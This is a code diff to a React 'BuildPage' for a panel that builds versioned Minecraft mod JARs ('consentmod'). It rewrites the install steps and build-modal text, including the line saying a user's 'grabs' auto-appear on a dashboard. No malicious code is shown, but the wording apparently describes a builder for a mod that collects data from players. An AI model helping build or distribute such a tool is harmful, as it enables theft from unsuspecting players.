@@ -163,18 +163,14 @@ export default function BuildPage() {
           <div style={{ fontSize: 14, fontWeight: 600, color: colors.text, marginBottom: 10, display: 'flex', alignItems: 'center', gap: 8 }}>
             <span>📦</span> How It Works
           </div>
-          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 16 }}>
+          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
             <div style={{ fontSize: 13, color: colors.textDim }}>
-              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>1. Confirm Email</div>
-              Enter your email and click Confirm. This tags your grabs.
+              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>1. Link Minecraft Username</div>
+              Go to Dashboard and enter your Minecraft username. This links your account to your mod grabs automatically.
             </div>
             <div style={{ fontSize: 13, color: colors.textDim }}>
-              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>2. Download JAR</div>
-              Each download creates a new versioned JAR (consentmod-0.0.X-YYYY.jar).
-            </div>
-            <div style={{ fontSize: 13, color: colors.textDim }}>
-              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>3. Run INSTALL.bat</div>
-              Extract the JAR, run INSTALL.bat — it auto-places your config.txt in .minecraft/consentmod/.
+              <div style={{ color: colors.green, fontWeight: 600, marginBottom: 4 }}>2. Download &amp; Install</div>
+              Download the JAR, place it in your Minecraft mods folder. Your grabs will auto-appear on your dashboard.
             </div>
           </div>
         </div>
@@ -200,13 +196,13 @@ export default function BuildPage() {
         <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}>
           <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 16, padding: '40px 48px', textAlign: 'center', minWidth: 400 }}>
             <div style={{ fontSize: 18, fontWeight: 600, color: colors.text, marginBottom: 8 }}>Building your mod...</div>
-            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 24 }}>Versioning for <strong style={{ color: colors.green }}>{email}</strong> and packaging with INSTALL.bat</div>
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 24 }}>Building versioned mod for <strong style={{ color: colors.green }}>{email}</strong></div>
             <div style={{ background: '#1a1b24', borderRadius: 8, height: 8, overflow: 'hidden', marginBottom: 16 }}>
               <div style={{ background: colors.green, height: '100%', width: `${progress}%`, borderRadius: 8, transition: 'width 0.1s linear' }} />
             </div>
             <div style={{ fontSize: 13, color: colors.green, fontWeight: 600 }}>{progress}%</div>
             {progress >= 100 && (
-              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 12 }}>Download starting — extract JAR and run INSTALL.bat</div>
+              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 12 }}>Download starting — place JAR in your Minecraft mods folder</div>
             )}
           </div>
         </div>
